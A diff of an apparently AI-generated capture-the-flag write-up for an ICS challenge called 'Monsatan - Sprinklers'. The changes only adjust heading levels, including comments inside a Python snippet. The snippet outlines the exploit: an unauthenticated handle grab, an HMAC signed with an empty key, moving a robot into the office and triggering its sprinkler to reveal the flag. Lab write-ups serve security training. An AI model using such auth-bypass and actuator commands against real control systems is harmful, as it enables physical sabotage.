@@ -6,9 +6,6 @@ tags = ["agent-slop", "ics", "solved"]
 model = "Sonnet (default)"
 draft = false
 +++
-
-# Monsatan - Sprinklers (Topic 59980)
-
 Status: **SOLVED** — 2/2 sub-flags captured
 
 ## Context
@@ -32,7 +29,7 @@ _Preserved from pre-standardization writeup(s). May contain duplicate context._
 
 ### From `59980-monsatan-sprinklers.md`
 
-# Monsatan - Sprinklers (Topic 59980)
+## Monsatan - Sprinklers (Topic 59980)
 
 Status: **SOLVED** — 2/2 sub-flags captured
 
@@ -49,7 +46,7 @@ Status: **SOLVED** — 2/2 sub-flags captured
 
 ### From `59980-monsatan-sprinklers.md`
 
-# Monsatan - Sprinklers (Topic 59980) - Writeup
+## Monsatan - Sprinklers (Topic 59980) - Writeup
 
 ## Challenge Summary
 
@@ -150,21 +147,21 @@ import socket, struct, hmac, hashlib
 def sig(username, cmd, payload):
     return hmac.new(b'', username + struct.pack('<I', cmd) + payload, hashlib.sha256).digest()
 
-# 1. Acquire handle (unauth) for a Free robot
-#    cmd=0x3ec, payload=robotID + b'\0' -> server returns 4-byte handle
+## 1. Acquire handle (unauth) for a Free robot
+##    cmd=0x3ec, payload=robotID + b'\0' -> server returns 4-byte handle
 
-# 2. (Optional) Authenticated get_pos with empty key/user:
-#    sig = HMAC-SHA256(b'', b'' + 0x7d1.to_bytes(4) + handle_le32)
+## 2. (Optional) Authenticated get_pos with empty key/user:
+##    sig = HMAC-SHA256(b'', b'' + 0x7d1.to_bytes(4) + handle_le32)
 
-# 3. move robot to office (room=3):
-#    cmd=0x7d2 payload=struct.pack('<IIff', handle, 3, 5.0, 5.0)
+## 3. move robot to office (room=3):
+##    cmd=0x7d2 payload=struct.pack('<IIff', handle, 3, 5.0, 5.0)
 
-# 4. start_sprinkler cmd=0x7d3 payload=handle
+## 4. start_sprinkler cmd=0x7d3 payload=handle
 
-# 5. status cmd=0x7d5 payload=handle  ->  
-#    "STATUS: EMERGENCY LOCKDOWN\nSPRINKLER ACTIVE: YES\n...\nFATAL ERROR: FLAG-{...}"
+## 5. status cmd=0x7d5 payload=handle  ->  
+##    "STATUS: EMERGENCY LOCKDOWN\nSPRINKLER ACTIVE: YES\n...\nFATAL ERROR: FLAG-{...}"
 
-# 6. release cmd=0x3ed payload=handle
+## 6. release cmd=0x3ed payload=handle
 ```
 
 Used robot `Zg67uT3WNZfZ` (handle 1). Status after spraying in office:
